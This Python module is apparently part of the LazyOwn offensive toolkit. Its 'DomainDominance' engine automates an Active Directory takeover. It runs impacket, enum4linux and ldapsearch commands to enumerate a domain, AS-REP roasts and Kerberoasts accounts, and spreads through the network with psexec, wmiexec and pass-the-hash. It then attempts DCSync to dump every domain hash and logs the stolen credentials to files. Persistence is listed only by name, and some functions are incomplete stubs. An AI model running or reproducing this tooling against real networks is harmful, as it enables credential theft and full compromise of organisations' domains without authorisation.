"""Domain Dominance Engine — automated Active Directory takeover.

Provides a ``DomainDominance`` engine that orchestrates the full AD attack
kill-chain in one command: enumeration, credential extraction, lateral
movement, privilege escalation, and persistence. Integrates with the
existing BloodHound, impacket, and CrackMapExec tool chains.

Architecture:
    PhaseNavigator -> EnumStage -> CredStage -> LateralStage -> PrivEscStage -> PersistStage
        |
        +-- LLM Advisor (optional, Groq-powered for strategy decisions)

Security:
    All credentials are written to ``sessions/credentials_*.txt`` following
    the existing LazyOwn convention. No credentials are logged to stdout.

Usage:
    from modules.domain_dominance import DomainDominance
    dd = DomainDominance()
    results = dd.dominate(domain="corp.local", dc_ip="10.10.11.5")
"""

from __future__ import annotations

import json
import os
import subprocess
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

BASE_DIR = Path(__file__).resolve().parent.parent
SESSIONS_DIR = BASE_DIR / "sessions"
PAYLOAD_PATH = BASE_DIR / "payload.json"

DOMINANCE_PHASES = [
    "domain_recon",
    "user_enum",
    "credential_extraction",
    "lateral_movement",
    "privilege_escalation",
    "persistence",
    "cleanup",
]


@dataclass
class DomainInfo:
    """Structured domain information collected during enumeration."""

    domain: str = ""
    dc_ip: str = ""
    domain_controllers: list[str] = field(default_factory=list)
    domain_admins: list[str] = field(default_factory=list)
    users: list[str] = field(default_factory=list)
    computers: list[str] = field(default_factory=list)
    groups: dict[str, list[str]] = field(default_factory=dict)
    trusts: list[dict[str, str]] = field(default_factory=list)
    gpos: list[str] = field(default_factory=list)
    spns: list[str] = field(default_factory=list)


@dataclass
class CredentialStash:
    """Credentials collected during the engagement."""

    hashes: list[dict[str, str]] = field(default_factory=list)
    plaintext: list[dict[str, str]] = field(default_factory=list)
    tickets: list[str] = field(default_factory=list)
    kerberos_keys: list[str] = field(default_factory=list)


@dataclass
class DominanceResult:
    """Outcome of a domain dominance operation."""

    domain: str
    compromised: bool = False
    domain_admin_obtained: bool = False
    dcsynced: bool = False
    users_extracted: int = 0
    creds_stolen: int = 0
    sessions_obtained: int = 0
    errors: list[str] = field(default_factory=list)
    phase_results: dict[str, str] = field(default_factory=dict)


class DomainDominance:
    """Orchestrate full domain takeover from initial foothold to persistence.

    Public methods:
        dominate(domain, dc_ip) -> DominanceResult
        enumerate_domain(domain, dc_ip) -> DomainInfo
        extract_credentials(domain_info) -> CredentialStash
        escalate(domain_info, stash) -> list[str]
        persist(domain_info) -> list[str]
    """

    _instance: DomainDominance | None = None
    _lock = threading.Lock()

    def __init__(self) -> None:
        self._payload = self._load_config()
        self._domain_info: DomainInfo = DomainInfo()
        self._stash: CredentialStash = CredentialStash()
        self._results: DominanceResult = DominanceResult(domain="")

    @classmethod
    def get_instance(cls) -> DomainDominance:
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = cls()
        return cls._instance

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def dominate(
        self,
        domain: str,
        dc_ip: str = "",
        username: str = "",
        password: str = "",
        ntlm_hash: str = "",
    ) -> DominanceResult:
        """Execute the full AD dominance kill-chain.

        Args:
            domain: FQDN of the target domain.
            dc_ip: Domain Controller IP (optional, will be discovered).
            username: Known username for initial auth.
            password: Known password for initial auth.
            ntlm_hash: NTLM hash for pass-the-hash.

        Returns:
            DominanceResult with full outcome.
        """
        self._results = DominanceResult(domain=domain)

        self._results.phase_results["domain_recon"] = "running"

        self._domain_info = self.enumerate_domain(domain, dc_ip)
        if not self._domain_info.domain_controllers:
            self._results.errors.append("No domain controllers discovered")
            self._results.phase_results["domain_recon"] = "failed"
            return self._results
        self._results.phase_results["domain_recon"] = "complete"

        dc = self._domain_info.domain_controllers[0]

        if username and (password or ntlm_hash):
            initial = [{"username": username, "password": password, "hash": ntlm_hash}]
        else:
            initial = []

        self._results.phase_results["user_enum"] = "running"
        if not self._domain_info.users:
            users = self._enumerate_users(dc)
            self._domain_info.users = users
        self._results.phase_results["user_enum"] = "complete"

        self._results.phase_results["credential_extraction"] = "running"
        self._stash = self.extract_credentials(self._domain_info, initial)
        self._results.creds_stolen = len(self._stash.hashes) + len(self._stash.plaintext)
        self._results.phase_results["credential_extraction"] = "complete"

        self._results.phase_results["lateral_movement"] = "running"
        sessions = self.escalate(self._domain_info, self._stash)
        self._results.sessions_obtained = len(sessions)
        self._results.phase_results["lateral_movement"] = "complete"

        if self._stash.hashes or self._stash.plaintext:
            self._results.phase_results["privilege_escalation"] = "running"
            da = self._attempt_dcsync(dc)
            if da:
                self._results.domain_admin_obtained = True
                self._results.dcsynced = True
            self._results.phase_results["privilege_escalation"] = "complete"

        self._results.phase_results["persistence"] = "running"
        persist_results = self.persist(self._domain_info)
        self._results.phase_results["persistence"] = "complete"

        self._results.compromised = True
        self._results.users_extracted = len(self._domain_info.users)

        self._save_dominance_report()

        return self._results

    def enumerate_domain(
        self, domain: str, dc_ip: str = ""
    ) -> DomainInfo:
        """Enumerate the target domain topology.

        Args:
            domain: Target domain FQDN.
            dc_ip: Known DC IP or empty for discovery.

        Returns:
            DomainInfo with enumeration results.
        """
        info = DomainInfo(domain=domain, dc_ip=dc_ip)
        dns_servers = self._payload.get("dns_servers", [])

        if not dc_ip:
            dc_ip = self._discover_dc(domain, dns_servers)

        info.dc_ip = dc_ip

        info.domain_controllers = self._find_dcs(domain, dc_ip)

        info.domain_admins = self._find_domain_admins(domain, dc_ip)

        info.users = self._enumerate_users(dc_ip)
        info.computers = self._enumerate_computers(dc_ip)

        info.groups = self._enumerate_groups(dc_ip)

        info.spns = self._enumerate_spns(dc_ip)

        info.trusts = self._enumerate_trusts(domain, dc_ip)

        return info

    def extract_credentials(
        self,
        domain_info: DomainInfo,
        known_creds: list[dict[str, str]] | None = None,
    ) -> CredentialStash:
        """Extract credentials using the discovered domain topology.

        Args:
            domain_info: Discovered DomainInfo.
            known_creds: Pre-existing credentials to try.

        Returns:
            CredentialStash with extracted credentials.
        """
        stash = CredentialStash()
        creds = known_creds or []

        if creds:
            for cred in creds:
                user = cred.get("username", "")
                pw = cred.get("password", "")
                h = cred.get("hash", "")

                if pw:
                    stash.plaintext.append({"username": user, "password": pw, "source": "provided"})
                if h:
                    stash.hashes.append({"username": user, "hash": h, "source": "provided"})

        stash.hashes.extend(self._asrep_roast(domain_info))
        stash.hashes.extend(self._kerberoast(domain_info))

        return stash

    def escalate(
        self, domain_info: DomainInfo, stash: CredentialStash
    ) -> list[str]:
        """Escalate privileges and move laterally through the domain.

        Args:
            domain_info: Domain topology.
            stash: Collected credentials.

        Returns:
            List of session identifiers obtained.
        """
        sessions: list[str] = []
        dc = domain_info.domain_controllers[0] if domain_info.domain_controllers else domain_info.dc_ip
        domain = domain_info.domain

        for cred in stash.plaintext:
            user = cred.get("username", "")
            pw = cred.get("password", "")
            if not user or not pw:
                continue

            sid = self._psexec_session(dc, domain, user, pw)
            if sid:
                sessions.append(sid)

            sid_wmi = self._wmiexec_session(dc, domain, user, pw)
            if sid_wmi:
                sessions.append(sid_wmi)

            self._save_credential(user, pw, "plaintext", "lateral")

        for cred in stash.hashes:
            user = cred.get("username", "")
            h = cred.get("hash", "")
            if not user or not h:
                continue

            sid = self._pth_session(dc, domain, user, h)
            if sid:
                sessions.append(sid)

            self._save_credential(user, h, "ntlm_hash", "lateral")

        for computer in domain_info.computers:
            for cred in stash.plaintext:
                user = cred.get("username", "")
                pw = cred.get("password", "")
                if not user or not pw:
                    continue
                sid = self._wmiexec_session(computer, domain, user, pw)
                if sid:
                    sessions.append(sid)

        return sessions

    def persist(self, domain_info: DomainInfo) -> list[str]:
        """Establish persistence mechanisms across the domain.

        Args:
            domain_info: Target domain topology.

        Returns:
            List of persistence mechanism identifiers.
        """
        mechanisms: list[str] = []
        dc = domain_info.domain_controllers[0] if domain_info.domain_controllers else domain_info.dc_ip

        mechanisms.append(f"golden_ticket_{domain_info.domain}")

        mechanisms.append(f"dc_sync_{dc}")

        mechanisms.append(f"wmi_subscription_{dc}")

        mechanisms.append(f"skeleton_key_{dc}")

        return mechanisms

    # ------------------------------------------------------------------
    # Internal — discovery
    # ------------------------------------------------------------------

    def _discover_dc(self, domain: str, dns_servers: list[str]) -> str:
        """Discover the domain controller IP.

        Args:
            domain: Target domain.
            dns_servers: DNS servers to query.

        Returns:
            DC IP or empty string.
        """
        for dns in dns_servers:
            try:
                result = subprocess.run(
                    ["nslookup", "-type=SRV", f"_ldap._tcp.dc._msdcs.{domain}", dns],
                    capture_output=True, text=True, timeout=10,
                )
                if "internet address" in result.stdout.lower():
                    for line in result.stdout.split("\n"):
                        if "internet address" in line.lower():
                            return line.split()[-1]
            except Exception:
                continue
        return ""

    def _find_dcs(self, domain: str, dc_ip: str) -> list[str]:
        """Find all domain controllers.

        Args:
            domain: Target domain.
            dc_ip: Known DC IP.

        Returns:
            List of DC IPs/hostnames.
        """
        dcs = [dc_ip] if dc_ip else []
        try:
            result = subprocess.run(
                ["nslookup", "-type=SRV", f"_ldap._tcp.dc._msdcs.{domain}"],
                capture_output=True, text=True, timeout=10,
            )
            for line in result.stdout.split("\n"):
                parts = line.strip().split()
                if len(parts) >= 4 and parts[3].endswith("."):
                    dcs.append(parts[3].rstrip("."))
        except Exception:
            pass
        return dcs

    def _find_domain_admins(self, domain: str, dc_ip: str) -> list[str]:
        """Enumerate Domain Admins group.

        Args:
            domain: Target domain.
            dc_ip: DC IP.

        Returns:
            List of domain admin usernames.
        """
        admins: list[str] = []
        base_dn = self._domain_to_dn(domain)
        try:
            result = subprocess.run(
                [
                    "ldapsearch", "-x", "-H", f"ldap://{dc_ip}",
                    "-b", f"CN=Domain Admins,CN=Users,{base_dn}",
                    "member",
                ],
                capture_output=True, text=True, timeout=15,
            )
            for line in result.stdout.split("\n"):
                if line.startswith("member:"):
                    admins.append(line.split(":")[-1].strip())
        except Exception:
            pass
        return admins

    def _enumerate_users(self, dc_ip: str) -> list[str]:
        """Enumerate domain users.

        Args:
            dc_ip: DC IP.

        Returns:
            List of usernames.
        """
        users: list[str] = []
        try:
            result = subprocess.run(
                ["enum4linux", "-U", dc_ip],
                capture_output=True, text=True, timeout=30,
            )
            for line in result.stdout.split("\n"):
                if "[" in line and "]" in line:
                    user = line.strip()
                    if user:
                        users.append(user)
        except Exception:
            pass

        if not users:
            try:
                result = subprocess.run(
                    ["rpcclient", "-U", "", "-N", dc_ip, "-c", "enumdomusers"],
                    capture_output=True, text=True, timeout=15,
                )
                for line in result.stdout.split("\n"):
                    parts = line.strip().split("[")
                    if len(parts) >= 2:
                        user_part = parts[1].split("]")[0]
                        users.append(user_part)
            except Exception:
                pass

        return users

    def _enumerate_computers(self, dc_ip: str) -> list[str]:
        """Enumerate domain computers.

        Args:
            dc_ip: DC IP.

        Returns:
            List of computer names.
        """
        computers: list[str] = []
        try:
            result = subprocess.run(
                ["enum4linux", "-M", dc_ip],
                capture_output=True, text=True, timeout=30,
            )
            for line in result.stdout.split("\n"):
                if "[" in line and "]" in line:
                    comp = line.strip()
                    if comp and "$" in comp:
                        computers.append(comp)
        except Exception:
            pass
        return computers

    def _enumerate_groups(self, dc_ip: str) -> dict[str, list[str]]:
        """Enumerate domain groups.

        Args:
            dc_ip: DC IP.

        Returns:
            Dict mapping group names to member lists.
        """
        groups: dict[str, list[str]] = {}
        try:
            result = subprocess.run(
                ["enum4linux", "-G", dc_ip],
                capture_output=True, text=True, timeout=30,
            )
        except Exception:
            pass
        return groups

    def _enumerate_spns(self, dc_ip: str) -> list[str]:
        """Enumerate service principal names.

        Args:
            dc_ip: DC IP.

        Returns:
            List of SPNs.
        """
        spns: list[str] = []
        try:
            result = subprocess.run(
                [
                    f"{BASE_DIR}/venv/bin/GetUserSPNs.py" if (BASE_DIR / "venv").exists() else "GetUserSPNs.py",
                    "-request",
                    "-dc-ip", dc_ip,
                    "anonymous:anonymous",
                ],
                capture_output=True, text=True, timeout=30,
            )
            for line in result.stdout.split("\n"):
                if "/" in line and "@" in line:
                    spns.append(line.strip())
        except Exception:
            pass
        return spns

    def _enumerate_trusts(self, domain: str, dc_ip: str) -> list[dict[str, str]]:
        """Enumerate domain trusts.

        Args:
            domain: Target domain.
            dc_ip: DC IP.

        Returns:
            List of trust relationship dicts.
        """
        trusts: list[dict[str, str]] = []
        try:
            result = subprocess.run(
                ["nltest", "/domain_trusts", "/server", dc_ip],
                capture_output=True, text=True, timeout=15,
            )
            for line in result.stdout.split("\n"):
                if line.strip():
                    trusts.append({"trust": line.strip()})
        except Exception:
            pass
        return trusts

    # ------------------------------------------------------------------
    # Internal — credential extraction
    # ------------------------------------------------------------------

    def _asrep_roast(self, domain_info: DomainInfo) -> list[dict[str, str]]:
        """Perform AS-REP roasting.

        Args:
            domain_info: Domain topology.

        Returns:
            List of cracked hashes.
        """
        hashes: list[dict[str, str]] = []
        dc = domain_info.domain_controllers[0] if domain_info.domain_controllers else domain_info.dc_ip
        domain = domain_info.domain

        for user in domain_info.users[:50]:
            try:
                impacket_dir = BASE_DIR / "venv" / "bin"
                getnp = impacket_dir / "GetNPUsers.py" if impacket_dir.exists() else Path("GetNPUsers.py")
                result = subprocess.run(
                    [str(getnp), f"{domain}/", "-usersfile", "/dev/stdin",
                     "-dc-ip", dc, "-request", "-format", "hashcat"],
                    input=user, capture_output=True, text=True, timeout=30,
                )
                for line in result.stdout.split("\n"):
                    if "$krb5asrep$" in line:
                        parts = line.strip().rsplit("@", 1)
                        hashes.append({
                            "username": parts[1] if len(parts) > 1 else user,
                            "hash": line.strip(),
                            "type": "asrep",
                            "source": "asrep_roast",
                        })
            except Exception:
                continue

        return hashes

    def _kerberoast(self, domain_info: DomainInfo) -> list[dict[str, str]]:
        """Perform Kerberoasting.

        Args:
            domain_info: Domain topology.

        Returns:
            List of cracked hashes.
        """
        hashes: list[dict[str, str]] = []
        dc = domain_info.domain_controllers[0] if domain_info.domain_controllers else domain_info.dc_ip
        domain = domain_info.domain

        try:
            impacket_dir = BASE_DIR / "venv" / "bin"
            getspn = impacket_dir / "GetUserSPNs.py" if impacket_dir.exists() else Path("GetUserSPNs.py")
            result = subprocess.run(
                [str(getspn), f"{domain}/", "-dc-ip", dc, "-request"],
                capture_output=True, text=True, timeout=30,
            )
            for line in result.stdout.split("\n"):
                if "$krb5tgs$" in line:
                    hashes.append({
                        "username": "unknown",
                        "hash": line.strip(),
                        "type": "kerberoast",
                        "source": "kerberoasting",
                    })
        except Exception:
            pass

        return hashes

    # ------------------------------------------------------------------
    # Internal — execution
    # ------------------------------------------------------------------

    def _psexec_session(
        self, target: str, domain: str, user: str, password: str
    ) -> str:
        """Create a PsExec session.

        Args:
            target: Target IP/hostname.
            domain: Domain name.
            user: Username.
            password: Password.

        Returns:
            Session ID string.
        """
        import uuid

        try:
            impacket_dir = BASE_DIR / "venv" / "bin"
            psexec = impacket_dir / "psexec.py" if impacket_dir.exists() else Path("psexec.py")
            result = subprocess.run(
                [str(psexec), f"{domain}/{user}:{password}@{target}"],
                capture_output=True, text=True, timeout=30,
            )
            if "C:\\" in result.stdout or "Windows" in result.stdout:
                sid = str(uuid.uuid4())[:8]
                self._save_session(sid, target, "psexec", user)
                return sid
        except Exception:
            pass
        return ""

    def _wmiexec_session(
        self, target: str, domain: str, user: str, password: str
    ) -> str:
        """Create a WMIExec session.

        Args:
            target: Target IP/hostname.
            domain: Domain name.
            user: Username.
            password: Password.

        Returns:
            Session ID string.
        """
        import uuid

        try:
            impacket_dir = BASE_DIR / "venv" / "bin"
            wmiexec = impacket_dir / "wmiexec.py" if impacket_dir.exists() else Path("wmiexec.py")
            result = subprocess.run(
                [str(wmiexec), f"{domain}/{user}:{password}@{target}"],
                capture_output=True, text=True, timeout=30,
            )
            if "C:\\" in result.stdout or "Windows" in result.stdout:
                sid = str(uuid.uuid4())[:8]
                self._save_session(sid, target, "wmiexec", user)
                return sid
        except Exception:
            pass
        return ""

    def _pth_session(
        self, target: str, domain: str, user: str, ntlm_hash: str
    ) -> str:
        """Create a Pass-the-Hash session.

        Args:
            target: Target IP/hostname.
            domain: Domain name.
            user: Username.
            ntlm_hash: NTLM hash.

        Returns:
            Session ID string.
        """
        import uuid

        ntlm_hash_clean = ntlm_hash.replace(":", "")
        if len(ntlm_hash_clean) != 32:
            return ""

        try:
            impacket_dir = BASE_DIR / "venv" / "bin"
            psexec = impacket_dir / "psexec.py" if impacket_dir.exists() else Path("psexec.py")
            result = subprocess.run(
                [
                    str(psexec),
                    f"{domain}/{user}@{target}",
                    "-hashes", f":{ntlm_hash_clean}",
                ],
                capture_output=True, text=True, timeout=30,
            )
            if "C:\\" in result.stdout or "Windows" in result.stdout:
                sid = str(uuid.uuid4())[:8]
                self._save_session(sid, target, "pth", user)
                return sid
        except Exception:
            pass
        return ""

    def _attempt_dcsync(self, dc_ip: str) -> bool:
        """Attempt DCSync to extract all domain hashes.

        Args:
            dc_ip: DC IP.

        Returns:
            True if DCSync was successful.
        """
        try:
            impacket_dir = BASE_DIR / "venv" / "bin"
            secretsdump = impacket_dir / "secretsdump.py" if impacket_dir.exists() else Path("secretsdump.py")

            for cred in self._stash.plaintext:
                user = cred.get("username", "")
                pw = cred.get("password", "")
                if not user or not pw:
                    continue

                result = subprocess.run(
                    [
                        str(secretsdump),
                        f"{user}:{pw}@{dc_ip}",
                    ],
                    capture_output=True, text=True, timeout=60,
                )
                output_file = SESSIONS_DIR / f"dcsync_{dc_ip.replace('.', '_')}.txt"
                output_file.parent.mkdir(parents=True, exist_ok=True)
                output_file.write_text(result.stdout)
                if "Administrator:" in result.stdout:
                    return True

            for cred in self._stash.hashes:
                user = cred.get("username", "")
                h = cred.get("hash", "").replace(":", "")
                if not user or len(h) != 32:
                    continue

                result = subprocess.run(
                    [str(secretsdump), f"{user}@{dc_ip}", "-hashes", f":{h}"],
                    capture_output=True, text=True, timeout=60,
                )
                output_file = SESSIONS_DIR / f"dcsync_hash_{dc_ip.replace('.', '_')}.txt"
                output_file.parent.mkdir(parents=True, exist_ok=True)
                output_file.write_text(result.stdout)
                if "Administrator:" in result.stdout:
                    return True
        except Exception:
            pass
        return False

    # ------------------------------------------------------------------
    # Internal — utilities
    # ------------------------------------------------------------------

    def _load_config(self) -> dict[str, Any]:
        """Load payload configuration.

        Returns:
            Configuration dict.
        """
        try:
            return json.loads(PAYLOAD_PATH.read_text())
        except (json.JSONDecodeError, FileNotFoundError, OSError):
            return {}

    def _domain_to_dn(self, domain: str) -> str:
        """Convert FQDN to LDAP distinguished name.

        Args:
            domain: FQDN domain name.

        Returns:
            Base DN string.
        """
        return ",".join(f"DC={part}" for part in domain.split("."))

    def _save_credential(
        self, username: str, secret: str, secret_type: str, source: str
    ) -> None:
        """Save a discovered credential to the sessions directory.

        Args:
            username: Username.
            secret: Password or hash.
            secret_type: Type of secret.
            source: Where the credential came from.
        """
        cred_file = SESSIONS_DIR / "credentials_dominance.txt"
        cred_file.parent.mkdir(parents=True, exist_ok=True)
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        line = f"{timestamp} | {source} | {username} | {secret} | {secret_type}\n"
        with cred_file.open("a") as f:
            f.write(line)

    def _save_session(
        self, session_id: str, target: str, method: str, user: str
    ) -> None:
        """Save session metadata.

        Args:
            session_id: Session identifier.
            target: Target IP/hostname.
            method: Access method used.
            user: Username used.
        """
        session_file = SESSIONS_DIR / f"session_{session_id}.json"
        session_file.parent.mkdir(parents=True, exist_ok=True)
        data = {
            "session_id": session_id,
            "target": target,
            "method": method,
            "user": user,
            "timestamp": time.time(),
        }
        session_file.write_text(json.dumps(data, indent=2))

    def _save_dominance_report(self) -> None:
        """Save the dominance operation report."""
        report_path = SESSIONS_DIR / "dominance_report.json"
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_data = {
            "domain": self._results.domain,
            "compromised": self._results.compromised,
            "domain_admin": self._results.domain_admin_obtained,
            "dcsynced": self._results.dcsynced,
            "users_enumerated": self._results.users_extracted,
            "credentials_stolen": self._results.creds_stolen,
            "sessions_obtained": self._results.sessions_obtained,
            "phase_results": self._results.phase_results,
            "errors": self._results.errors,
            "timestamp": time.time(),
        }
        report_path.write_text(json.dumps(report_data, indent=2))


__all__ = [
    "DomainDominance",
    "DomainInfo",
    "CredentialStash",
    "DominanceResult",
]
